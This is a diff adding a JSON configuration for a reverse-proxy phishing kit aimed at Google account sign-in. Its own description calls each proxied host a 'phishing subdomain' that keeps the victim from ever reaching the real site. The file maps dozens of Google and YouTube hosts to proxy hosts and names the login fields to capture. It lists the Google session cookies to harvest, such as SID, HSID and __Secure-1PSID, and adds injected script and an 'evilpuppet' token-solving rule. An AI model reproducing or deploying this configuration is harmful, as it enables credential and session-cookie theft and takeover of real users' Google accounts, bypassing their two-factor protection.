@@ -1,0 +1,246 @@
+{
+    "id": "google",
+    "name": "Google / Google Account",
+    "description": "Google authentication chain (accounts.google.com + consent + gstatic CDN). Every original host is mapped 1:1 to a phishing subdomain under the operator base domain (default google.test) so HTML/JS/redirect references are rewritten and the victim never reaches the real origin.",
+    "redirect_url": "/",
+    "force_https": true,
+    "require_lure": false,
+    "enabled": true,
+    "username_field": "identifier",
+    "password_field": "Passwd",
+    "login_urls": [
+        "/"
+    ],
+    "auth_urls": [
+        "/"
+    ],
+    "routing_matrix": [
+        {
+            "upstream": "accounts.google.com",
+            "proxy_host": "accounts.google.test",
+            "is_primary": true
+        },
+        {
+            "upstream": "myaccount.google.com",
+            "proxy_host": "myaccount.google.test"
+        },
+        {
+            "upstream": "consent.google.com",
+            "proxy_host": "consent.google.test"
+        },
+        {
+            "upstream": "oauthconsent.google.com",
+            "proxy_host": "oauthconsent.google.test"
+        },
+        {
+            "upstream": "content.googleapis.com",
+            "proxy_host": "content-googleapis.google.test"
+        },
+        {
+            "upstream": "accounts.youtube.com",
+            "proxy_host": "accounts-youtube.google.test"
+        },
+        {
+            "upstream": "mail.google.com",
+            "proxy_host": "mail.google.test"
+        },
+        {
+            "upstream": "www.google.com",
+            "proxy_host": "www.google.test"
+        },
+        {
+            "upstream": "ssl.gstatic.com",
+            "proxy_host": "gstatic.google.test"
+        },
+        {
+            "upstream": "www.gstatic.com",
+            "proxy_host": "www-gstatic.google.test"
+        },
+        {
+            "upstream": "fonts.gstatic.com",
+            "proxy_host": "fonts-gstatic.google.test"
+        },
+        {
+            "upstream": "lh3.googleusercontent.com",
+            "proxy_host": "lh3-googleusercontent.google.test"
+        },
+        {
+            "upstream": "lh4.googleusercontent.com",
+            "proxy_host": "lh4-googleusercontent.google.test"
+        },
+        {
+            "upstream": "lh5.googleusercontent.com",
+            "proxy_host": "lh5-googleusercontent.google.test"
+        },
+        {
+            "upstream": "lh6.googleusercontent.com",
+            "proxy_host": "lh6-googleusercontent.google.test"
+        },
+        {
+            "upstream": "googleapis.com",
+            "proxy_host": "googleapis.google.test"
+        },
+        {
+            "upstream": "apis.google.com",
+            "proxy_host": "apis.google.test"
+        },
+        {
+            "upstream": "youtube.com",
+            "proxy_host": "youtube.google.test"
+        },
+        {
+            "upstream": "www.youtube.com",
+            "proxy_host": "www-youtube.google.test"
+        },
+        {
+            "upstream": "ogs.google.com",
+            "proxy_host": "ogs.google.test"
+        },
+        {
+            "upstream": "drive.google.com",
+            "proxy_host": "drive.google.test"
+        },
+        {
+            "upstream": "docs.google.com",
+            "proxy_host": "docs.google.test"
+        },
+        {
+            "upstream": "photos.google.com",
+            "proxy_host": "photos.google.test"
+        },
+        {
+            "upstream": "meet.google.com",
+            "proxy_host": "meet.google.test"
+        },
+        {
+            "upstream": "chat.google.com",
+            "proxy_host": "chat.google.test"
+        },
+        {
+            "upstream": "groups.google.com",
+            "proxy_host": "groups.google.test"
+        },
+        {
+            "upstream": "play.google.com",
+            "proxy_host": "play.google.test"
+        },
+        {
+            "upstream": "pay.google.com",
+            "proxy_host": "pay.google.test"
+        },
+        {
+            "upstream": "cloud.google.com",
+            "proxy_host": "cloud.google.test"
+        },
+        {
+            "upstream": "admin.google.com",
+            "proxy_host": "admin.google.test"
+        },
+        {
+            "upstream": "sites.google.com",
+            "proxy_host": "sites.google.test"
+        },
+        {
+            "upstream": "support.google.com",
+            "proxy_host": "support.google.test"
+        },
+        {
+            "upstream": "policies.google.com",
+            "proxy_host": "policies.google.test"
+        },
+        {
+            "upstream": "plus.google.com",
+            "proxy_host": "plus.google.test"
+        },
+        {
+            "upstream": "static.ytimg.com",
+            "proxy_host": "static-ytimg.google.test"
+        },
+        {
+            "upstream": "yt3.ggpht.com",
+            "proxy_host": "yt3-ggpht.google.test"
+        },
+        {
+            "upstream": "content-youtube.googleapis.com",
+            "proxy_host": "content-youtube-googleapis.google.test"
+        },
+        {
+            "upstream": "content-people.googleapis.com",
+            "proxy_host": "content-people-googleapis.google.test"
+        }
+    ],
+    "cookie_tracking": [
+        {
+            "domain": "accounts.google.com",
+            "name": "SID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "HSID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "SSID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "APISID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "SAPISID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "__Secure-1PSID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "__Secure-3PSID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "__Secure-1PAPISID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "__Secure-3PAPISID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "NID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "OTZ"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "CONSENT"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "OSID"
+        },
+        {
+            "domain": "accounts.google.com",
+            "name": "LSID"
+        }
+    ],
+    "telemetry_injection": {
+        "position": "head",
+        "code": "window.__ep_session=document.cookie.match(/EP_SESS=([^;]+)/)?document.cookie.match(/EP_SESS=([^;]+)/)[1]:null;"
+    },
+    "evilpuppet": {
+        "enabled": true,
+        "solve_url": "https://accounts.google.com",
+        "rules": [
+            {
+                "path": "/v3/signin",
+                "token_param": "",
+                "field": "identifier",
+                "real_path": "/"
+            }
+        ]
+    }
+}
